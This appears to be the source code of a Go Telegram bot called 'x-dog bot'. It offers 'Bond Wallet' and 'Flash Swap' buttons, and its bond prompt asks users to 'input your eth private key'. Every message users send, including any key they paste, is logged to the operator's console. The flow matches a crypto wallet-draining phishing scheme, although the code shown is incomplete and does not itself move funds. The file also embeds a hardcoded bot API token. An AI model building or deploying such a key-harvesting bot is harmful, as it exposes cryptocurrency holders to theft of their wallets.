package main

import (
	"bufio"
	"context"
	"fmt"
	"log"
	"os"
	"strings"

	tgbotapi "github.com/go-telegram-bot-api/telegram-bot-api/v5"
)

var (
	// Button texts
	bondButton   = "Bond Wallet"
	changeButton = "Change Wallet"
	swapButton   = "Flash Swap"
	nextButton   = "Next"
	backButton   = "Back"

	//index text
	startText = "welcome to use x-dog bot"
	bondText  = "please input your eth private key"

	// Store bot screaming status
	screaming = false
	bot       *tgbotapi.BotAPI

	startMarkup = tgbotapi.NewInlineKeyboardMarkup(
		tgbotapi.NewInlineKeyboardRow(
			tgbotapi.NewInlineKeyboardButtonData(bondButton, bondButton),
		),
	)
)

func main() {
	var err error
	bot, err = tgbotapi.NewBotAPI("6680679731:AAHLFR2QhioohAo7rwqCC_2azsYr7JdHKYE")
	if err != nil {
		// Abort if something is wrong
		log.Panic(err)
	}

	// Set this to true to log all interactions with telegram servers
	bot.Debug = false

	u := tgbotapi.NewUpdate(0)
	u.Timeout = 60

	// Create a new cancellable background context. Calling `cancel()` leads to the cancellation of the context
	ctx := context.Background()
	ctx, cancel := context.WithCancel(ctx)

	// `updates` is a golang channel which receives telegram updates
	updates := bot.GetUpdatesChan(u)

	// Pass cancellable context to goroutine
	go receiveUpdates(ctx, updates)

	// Tell the user the bot is online
	log.Println("Start listening for updates.")

	// Wait for a newline symbol, then cancel handling updates
	bufio.NewReader(os.Stdin).ReadBytes('\n')
	cancel()

}

func receiveUpdates(ctx context.Context, updates tgbotapi.UpdatesChannel) {
	// `for {` means the loop is infinite until we manually stop it
	for {
		select {
		// stop looping if ctx is cancelled
		case <-ctx.Done():
			return
		// receive update from channel and then handle it
		case update := <-updates:
			handleUpdate(update)
		}
	}
}

func handleUpdate(update tgbotapi.Update) {
	switch {
	// Handle messages
	case update.Message != nil:
		handleMessage(update.Message)
		break

	// Handle button clicks
	case update.CallbackQuery != nil:
		handleButton(update.CallbackQuery)
		break
	}
}

func handleMessage(message *tgbotapi.Message) {
	user := message.From
	text := message.Text

	if user == nil {
		return
	}

	// Print to console
	log.Printf("%s wrote %s", user.FirstName, text)

	var err error
	if strings.HasPrefix(text, "/") {
		err = handleCommand(message.Chat.ID, text)
	} else if screaming && len(text) > 0 {
		msg := tgbotapi.NewMessage(message.Chat.ID, strings.ToUpper(text))
		// To preserve markdown, we attach entities (bold, italic..)
		msg.Entities = message.Entities
		_, err = bot.Send(msg)
	} else {
		// This is equivalent to forwarding, without the sender's name
		copyMsg := tgbotapi.NewCopyMessage(message.Chat.ID, message.Chat.ID, message.MessageID)
		_, err = bot.CopyMessage(copyMsg)
	}

	if err != nil {
		log.Printf("An error occured: %s", err.Error())
	}
}

func handleButton(query *tgbotapi.CallbackQuery) {
	var text string

	markup := tgbotapi.NewInlineKeyboardMarkup()
	message := query.Message

	fmt.Println(query.Data)
	if query.Data == bondButton {
		text = bondText
		markup = startMarkup
	}

	fmt.Println(query.ID)
	fmt.Println(message.Chat.ID)
	callbackCfg := tgbotapi.NewCallback(query.ID, "")
	bot.Send(callbackCfg)

	// Replace menu text and keyboard
	fmt.Println(text)
	msg := tgbotapi.NewEditMessageTextAndMarkup(message.Chat.ID, message.MessageID, text, markup)
	msg.ParseMode = tgbotapi.ModeHTML
	bot.Send(msg)
}

// When we get a command, we react accordingly
func handleCommand(chatId int64, command string) error {
	var err error

	switch command {
	case "/start":
		sendStart(chatId)
		break

	case "/bond":
		break
	}

	return err
}

func sendStart(chatId int64) error {
	msg := tgbotapi.NewMessage(chatId, startText)
	msg.ParseMode = tgbotapi.ModeHTML
	msg.ReplyMarkup = startMarkup
	_, err := bot.Send(msg)
	return err
}

func sendBond(chatId int64) error {
	msg := tgbotapi.NewMessage(chatId, bondText)
	msg.ParseMode = tgbotapi.ModeHTML
	msg.ReplyMarkup = startMarkup
	_, err := bot.Send(msg)
	return err
}
